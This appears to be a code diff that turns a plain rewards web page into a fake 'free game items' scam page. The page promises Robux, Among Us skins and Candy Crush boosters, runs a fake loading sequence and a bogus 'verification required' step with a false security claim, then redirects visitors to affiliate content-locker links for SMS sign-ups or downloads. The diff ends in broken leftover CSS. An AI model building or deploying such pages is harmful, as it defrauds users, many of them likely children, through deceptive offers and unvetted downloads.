@@ -1,113 +1,199 @@
 
-<!DOCTYPE html>  
-<html lang="en">    
-<head>    
-<meta charset="UTF-8" />    
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />    
-<meta name="robots" content="noindex, nofollow, noarchive" />    
-<meta name="googlebot" content="noindex, nofollow" />    
-<title>Rewards Center</title>  
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">  
-<style>    
-:root{    
-    --primary:#00ffa6;    
-    --bg:#05070a;    
-    --card:#0d1117;    
-    --text:#e6edf3;    
-    --muted:#8b949e;    
-    --border:#1f2933;    
-}    
-*{margin:0;padding:0;box-sizing:border-box;}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SITE APP - Gaming Central</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-base: #020617;
+            --neon-green: #10b981;
+            --card-bg: #1e293b;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+        }
 
-body{
-font-family:'Inter',sans-serif;
-background:radial-gradient(circle at top,#0b1220,#05070a 60%);
-color:var(--text);
-min-height:100vh;
-}
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: var(--bg-base); color: var(--text-main); min-height: 100vh; overflow-x: hidden; }
 
-header{
-text-align:center;
-padding:72px 20px 34px;
-}
+        .container { max-width: 1000px; margin: 0 auto; padding: 20px; }
+        header { text-align: center; padding: 40px 0; }
+        .logo { font-size: 30px; font-weight: 900; color: var(--neon-green); text-decoration: none; letter-spacing: 3px; }
 
-header h1{
-font-size:clamp(34px,6vw,56px);
-font-weight:900;
-letter-spacing:-1px;
-line-height:1.05;
-}
+        .hero { text-align: center; margin-bottom: 50px; }
+        .hero h1 { font-size: 2.5rem; font-weight: 900; margin-bottom: 10px; }
+        .hero p { color: var(--text-muted); font-size: 1.1rem; }
 
-header p{
-color:var(--muted);
-margin-top:12px;
-font-size:16px;
-}
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 25px; }
 
-.container{
-display:flex;
-justify-content:center;
-flex-wrap:wrap;
-gap:24px;
-padding:22px 18px 40px;
-max-width:1100px;
-margin:0 auto;
-}
+        /* الحل النهائي للصور: تصاميم برمجية جذابة */
+        .card {
+            background: var(--card-bg);
+            border-radius: 24px;
+            border: 1px solid rgba(255,255,255,0.05);
+            overflow: hidden;
+            transition: 0.3s;
+            cursor: pointer;
+            text-align: center;
+            position: relative;
+        }
+        .card:hover { transform: translateY(-10px); border-color: var(--neon-green); }
 
-.card{
-width:min(100%, 320px);
-background:linear-gradient(180deg,#0f1520,#0b0f15);
-border:1px solid var(--border);
-border-radius:18px;
-overflow:hidden;
-transition:.25s ease;
-box-shadow:0 12px 40px rgba(0,0,0,.24);
-}
+        .game-visual {
+            width: 100%;
+            height: 160px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 2rem;
+            color: white;
+            text-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            text-transform: uppercase;
+        }
 
-.card:hover{
-transform:translateY(-6px);
-border-color:rgba(0,255,166,.65);
-}
+        /* تدرجات ألوان خاصة لكل لعبة لضمان الجاذبية */
+        .bg-roblox { background: linear-gradient(135deg, #450a0a, #ef4444); }
+        .bg-toca { background: linear-gradient(135deg, #1e3a8a, #3b82f6); }
+        .bg-among { background: linear-gradient(135deg, #064e3b, #10b981); }
+        .bg-candy { background: linear-gradient(135deg, #701a75, #d946ef); }
+        .bg-subway { background: linear-gradient(135deg, #78350f, #f59e0b); }
 
-.card-media{
-height:210px;
-background:#0a0d12;
-display:flex;
-align-items:center;
-justify-content:center;
-border-bottom:1px solid var(--border);
-}
+        .card-info { padding: 20px; }
+        .badge { background: var(--neon-green); color: #000; padding: 4px 12px; border-radius: 8px; font-size: 0.7rem; font-weight: 900; margin-bottom: 10px; display: inline-block; }
+        
+        .btn-claim {
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 12px;
+            font-weight: 900;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
 
-.card-media img{
-width:100%;
-height:100%;
-object-fit:cover;
-display:block;
-}
+        /* Modal */
+        .modal-overlay {
+            position: fixed; top:0; left:0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); display: none; justify-content: center; align-items: center; z-index: 1000;
+        }
+        .modal-content {
+            background: #0f172a; width: 90%; max-width: 400px; border-radius: 30px; 
+            padding: 30px; text-align: center; border: 1px solid var(--neon-green);
+        }
 
-.card-content{
-padding:18px;
-text-align:center;
-}
+        .loader-container { display: none; margin: 20px 0; }
+        .bar { width: 100%; height: 10px; background: #334155; border-radius: 10px; overflow: hidden; }
+        .fill { width: 0%; height: 100%; background: var(--neon-green); transition: 0.1s; }
 
-.card-content h3{
-font-size:22px;
-margin-bottom:14px;
-font-weight:800;
-}
+        .verify-screen { display: none; }
+        .offer {
+            background: rgba(255,255,255,0.05); border: 1px solid var(--neon-green);
+            padding: 15px; margin: 10px 0; border-radius: 15px; cursor: pointer; font-weight: 700;
+        }
+        .offer:hover { background: rgba(16, 185, 129, 0.1); }
+    </style>
+</head>
+<body>
 
-.btn{
-display:block;
-width:100%;
-border:none;
-background:linear-gradient(180deg,#00ffa6,#00d686);
-color:#04110b;
-padding:14px 16px;
-border-radius:12px;
-font-weight:900;
-font-size:15px;
-cursor:pointer;
-transition:.2s ease;
+<header><a href="#" class="logo">SITE APP</a></header>
+
+<div class="container">
+    <div class="hero">
+        <h1>Unlock Premium Rewards</h1>
+        <p>Choose your game and claim your exclusive content pack.</p>
+    </div>
+
+    <div class="grid" id="mainGrid"></div>
+</div>
+
+<div class="modal-overlay" id="modal">
+    <div class="modal-content">
+        <div id="step-1">
+            <div id="m-visual" class="game-visual" style="border-radius: 20px; margin-bottom: 20px;"></div>
+            <h2 id="m-title"></h2>
+            <p id="m-desc" style="color: var(--text-muted); margin: 15px 0;"></p>
+            <button class="btn-claim" onclick="goLoading()">Claim Package</button>
+        </div>
+
+        <div id="step-2" class="loader-container">
+            <p id="status" style="color: var(--neon-green); font-weight: 800; margin-bottom: 10px;">CONNECTING...</p>
+            <div class="bar"><div class="fill" id="fill"></div></div>
+        </div>
+
+        <div id="step-3" class="verify-screen">
+            <h2 style="color: #ef4444; font-weight: 900;">VERIFICATION REQUIRED</h2>
+            <p style="font-size: 0.9rem; margin: 15px 0;">Please complete one task below to prove you are not a bot and unlock your items.</p>
+            <div class="offer" onclick="finish()">📱 SMS Verification</div>
+            <div class="offer" onclick="finish()">📥 Download & Install</div>
+            <p style="font-size: 0.7rem; color: #64748b; margin-top: 15px;">Secure 256-bit Connection.</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    const games = [
+        { id: 'roblox', title: 'Roblox', class: 'bg-roblox', desc: 'Get 10,000 Robux and items.', url: 'https://singingfiles.com/show.php?l=0&u=2449875&id=74581' },
+        { id: 'toca', title: 'Toca Life', class: 'bg-toca', desc: 'Unlock all maps and pets.', url: 'https://singingfiles.com/show.php?l=0&u=2449875&id=74463' },
+        { id: 'among', title: 'Among Us', class: 'bg-among', desc: 'All skins and pets unlocked.', url: 'https://singingfiles.com/show.php?l=0&u=2449875&id=73209' },
+        { id: 'candy', title: 'Candy Crush', class: 'bg-candy', desc: 'Unlimited lives and boosters.', url: 'https://singingfiles.com/show.php?l=0&u=2449875&id=74581' },
+        { id: 'subway', title: 'Subway Surf', class: 'bg-subway', desc: 'Unlimited coins and keys.', url: 'https://singingfiles.com/show.php?l=0&u=2449875&id=74463' }
+    ];
+
+    const grid = document.getElementById('mainGrid');
+    let targetUrl = "";
+
+    games.forEach(g => {
+        const div = document.createElement('div');
+        div.className = 'card';
+        div.innerHTML = `
+            <div class="game-visual ${g.class}">${g.title}</div>
+            <div class="card-info">
+                <span class="badge">USA ONLY</span>
+                <h3>${g.title} Pack</h3>
+                <p style="font-size: 0.8rem; color: #94a3b8; margin: 10px 0;">Premium Edition</p>
+                <button class="btn-claim" style="padding: 8px;">Select</button>
+            </div>
+        `;
+        div.onclick = () => {
+            targetUrl = g.url;
+            document.getElementById('m-visual').className = 'game-visual ' + g.class;
+            document.getElementById('m-visual').innerText = g.title;
+            document.getElementById('m-title').innerText = g.title + " Reward";
+            document.getElementById('m-desc').innerText = g.desc;
+            document.getElementById('modal').style.display = 'flex';
+            document.getElementById('step-1').style.display = 'block';
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('step-3').style.display = 'none';
+        };
+        grid.appendChild(div);
+    });
+
+    function goLoading() {
+        document.getElementById('step-1').style.display = 'none';
+        document.getElementById('step-2').style.display = 'block';
+        let w = 0;
+        let f = document.getElementById('fill');
+        let s = document.getElementById('status');
+        const iv = setInterval(() => {
+            w++; f.style.width = w + '%';
+            if(w==30) s.innerText = "SEARCHING USER...";
+            if(w==60) s.innerText = "PACKING ITEMS...";
+            if(w==90) s.innerText = "FINALIZING...";
+            if(w>=100) { clearInterval(iv); document.getElementById('step-2').style.display = 'none'; document.getElementById('step-3').style.display = 'block'; }
+        }, 40);
+    }
+
+    function finish() { window.location.href = targetUrl; }
+</script>
+</body>
+</html>
+
+```
 text-align:center;
 text-decoration:none;
 box-sizing:border-box;
